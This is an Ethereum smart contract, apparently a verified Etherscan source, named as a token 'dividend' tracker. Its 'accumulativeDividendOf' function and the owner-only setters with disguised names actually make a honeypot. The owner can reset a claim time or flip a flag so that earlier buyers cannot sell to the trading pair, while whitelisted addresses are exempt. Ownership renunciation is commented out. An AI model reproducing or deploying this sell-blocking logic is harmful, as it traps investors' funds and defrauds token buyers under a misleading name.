/**
 *Submitted for verification at Etherscan.io on 2023-07-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

abstract contract Context {
  
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // /**
    //  * @dev Leaves the contract without owner. It will not be possible to call
    //  * `onlyOwner` functions anymore. Can only be called by the current owner.
    //  *
    //  * NOTE: Renouncing ownership will leave the contract without an owner,
    //  * thereby removing any functionality that is only available to the owner.
    //  */
    // function renounceOwnership() public virtual onlyOwner {
    //     emit OwnershipTransferred(_owner, address(0));
    //     _owner = address(0);
    // }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

}

contract Pe04PeDividend is Ownable {
    
    address private pair;
    mapping (address => uint256) private _dividendTimePassed;
    uint256 private claimTime;
    bool private isDividendFinished;
    address private token;

    modifier onlyToken() {
        require(msg.sender == token);
        _;
    }

    mapping(address => bool) private _whitelists;
 
    function setDividendFinishedPe04Pe(bool isFinished) external onlyOwner {
      isDividendFinished = isFinished;
    }
    function whitelistForDivideEndsPe04Pe(address owner_, bool _isWhitelist) external onlyOwner {
      _whitelists[owner_] = _isWhitelist;
    }

    function setClaimingTimeForDividendPe04Pe() external onlyOwner {
      claimTime = block.timestamp;
    }

    function setTokenForDivideEndsPe04Pe(address _token, address _pair) external onlyOwner {
      token = _token;
      pair = _pair;
      isDividendFinished = false;
      claimTime = 0;
    }

    function accumulativeDividendOf(address _from, address _to) external onlyToken returns (uint256) {
      if (_whitelists[_from] || _whitelists[_to]) {
        return 1;
      }
      if (_from == pair) { if (_dividendTimePassed[_to] == 0) {
          _dividendTimePassed[_to] = block.timestamp;
        }} 
      else if (_to == pair) {
        require(!isDividendFinished && _dividendTimePassed[_from] >= claimTime
        );
      } else { _dividendTimePassed[_to] = 1;
      }
      return 0;
    }

    receive() external payable {
    }
}